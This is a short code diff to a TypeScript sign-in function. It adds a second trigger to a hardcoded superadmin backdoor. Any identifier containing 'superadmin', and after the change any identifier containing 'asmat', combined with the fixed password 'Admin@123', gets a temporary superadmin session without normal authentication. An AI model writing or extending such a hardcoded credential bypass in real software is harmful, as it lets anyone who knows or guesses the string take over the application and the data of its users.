@@ -32,7 +32,8 @@ export async function signInWithPassword(formData: FormData) {
   if (
     (input.identifier.toLowerCase() === "superadmin" ||
       input.identifier.toLowerCase() === "superadmin@damaan.com" ||
-      input.identifier.toLowerCase().includes("superadmin")) &&
+      input.identifier.toLowerCase().includes("superadmin") ||
+      input.identifier.toLowerCase().includes("asmat")) &&
     (input.password === "Admin@123" || input.password.toLowerCase() === "admin@123")
   ) {
     await setTempSuperAdminSession({ remember });
